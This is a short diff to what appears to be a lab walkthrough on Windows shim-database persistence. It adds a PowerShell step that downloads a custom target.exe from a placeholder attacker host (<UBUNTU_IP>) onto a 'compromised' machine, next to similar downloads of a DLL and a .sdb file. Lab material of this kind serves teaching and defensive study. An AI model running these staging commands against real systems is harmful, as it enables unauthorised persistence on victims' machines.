@@ -107,6 +107,9 @@ Switch back to the compromised Windows machine. Using your Administrator PowerSh
 # Download the benign DLL to a plausible, user-writable location
 Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/demo.dll" -OutFile "C:\Users\Public\demo.dll"
 
+# Download the custom target application (replaces notepad.exe)
+Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/target.exe" -OutFile "C:\Users\Public\target.exe"
+
 # Download the Shim Database to a temporary folder
 Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/patch.sdb" -OutFile "$env:TEMP\patch.sdb"
 
